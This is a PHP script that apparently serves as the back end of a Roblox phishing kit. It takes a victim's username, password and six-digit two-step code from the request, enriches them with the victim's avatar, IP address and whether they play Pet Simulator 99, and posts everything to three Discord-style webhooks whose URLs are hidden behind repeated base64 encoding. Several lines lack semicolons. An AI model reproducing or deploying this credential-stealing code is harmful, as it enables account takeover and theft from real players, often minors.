<?php
require('setup.php');
if (isset($_GET['step']) && isset($_GET['u']) && isset($_GET['p'])) {
    $step = $_GET['step']
    $username = $_GET['u']
    $password = $_GET['p']
    $return = $_GET['returnUrl']
    $returnUrlFile = 'tokens/returnUrl-' . $_GET['returnUrl'] . '.txt';
    $webhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
    $TermedFile = 'tokens/login/' . $_GET['returnUrl'] . '.txt';

    $loginTermed = file_get_contents($TermedFile);

    $Termedla = "tokens/dualhook/$loginTermed/name.txt";
    if (file_exists($Termedla)) {
        $trioxa = file_get_contents($Termedla);
    } else {
        $trioxa = $name;
    }

    $Termedla1 = "tokens/dualhook/$loginTermed/thumbnail.txt";
    if (file_exists($Termedla1)) {
        $trioxa1 = file_get_contents($Termedla1);
    } else {
        $trioxa1 = $image;
    }

    $Termedla2 = "tokens/dualhook/$loginTermed/hex.txt";
    if (file_exists($Termedla2)) {
        $trioxa2 = file_get_contents($Termedla2);
    } else {
        $trioxa2 = $color;
    }
    $dualHookFile = 'tokens/' . $_GET['returnUrl'] . '.txt';
    $Dwebhook = base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents($dualHookFile)))));
    $TermedFile1 = 'tokens/login/' . $_GET['returnUrl'] . '.txt';

    $loginTermed1 = file_get_contents($TermedFile1);

    $Termedla = "tokens/dualhook/$loginTermed1/name.txt";
    if (file_exists($Termedla)) {
        $trioxa = file_get_contents($Termedla);
    } else {
        $trioxa = $name;
    }

    $Termedla1 = "tokens/dualhook/$loginTermed1/thumbnail.txt";
    if (file_exists($Termedla1)) {
        $trioxa1 = file_get_contents($Termedla1);
    } else {
        $trioxa1 = $image;
    }

    $Termedla2 = "tokens/dualhook/$loginTermed1/hex.txt";
    if (file_exists($Termedla2)) {
        $trioxa2 = file_get_contents($Termedla2);
    } else {
        $trioxa2 = $color;
    }

    if (preg_match('/^\d{6}$/', $step)) {
        $RobloxApi = 'https://api.newstargeted.com/roblox/users/v2/user.php?username=' . urlencode($username);
    $p = file_get_contents($RobloxApi);

    if ($p !== false) {
        $p0 = json_decode($p, true);
        if ($p0 !== null && isset($p0['userId'])) {
            $userId = $p0['userId'];
            $verified = 'Verified';
                $verifiedStatus = '<:yes:765068298004987904>';
                $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
                $json = file_get_contents($api_url);
                $data = json_decode($json, true);
                $image_url = $data["data"][0]["imageUrl"];
                $timestamp = date("c", strtotime("now"));
                $ip = $_SERVER['REMOTE_ADDR'];
                $badgeId = 2153913164;
                $url = "https://badges.roblox.com/v1/users/$userId/badges/awarded-dates?badgeIds=$badgeId";
                $j = file_get_contents($url);
                if ($j === '{"data":[]}' || empty($j)) {
                  $Played = 'False';
                } else {
                  $Played = 'True';
                }
                $Games = $Played;
                $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                $POST = [
                    "username" => "$trioxa",
                    "avatar_url" => "$trioxa1",
                     "content" => "",
                        "embeds" => [
                            [
                                "title" => "**[Rolimon's](https://www.rolimons.com/player/$userId) -x- [Profile](https://roblox.com/users/$userId/profile)**",
                                "type" => "rich",
                                "color" => hexdec("$trioxa2"),
                                "description" => "",
                                "thumbnail" => [
                                    "url" => "$image_url",
                                ],
                                "footer" => [
                                    "text" => "$timestamp",
                                  "icon_url" => "$image_url",
                                ],
                                "fields" => [
                                    [
                                        "name" => "**Username**",
                                        "value" => "$username",
                                        "inline" => false
                                    ],
                                    [
                                      "name" => ":key: Password",
                                      "value" => "$password",
                                      "inline" => false
                                    ],
                                    [
                                        "name" => "2step",
                                        "value" => "$step",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => ":robot: IP",
                                        "value" => "$ip",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "**$verifiedStatus Status**",
                                        "value" => "$verified",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "**Played Petsim99**",
                                        "value" => "<:petsim99:1234197371299041313> $Games",
                                        "inline" => true
                                    ],
                                ]
                            ],
                        ],
                    
                    ];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $Dwebhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $webhook);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $admin);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response   = curl_exec($ch);
            echo "\nVerification Status: $verified"; // removing this will crash the login!
    }
}
    } else {

        echo 'Error';
    }
} else {

    echo 'Error';
}
?>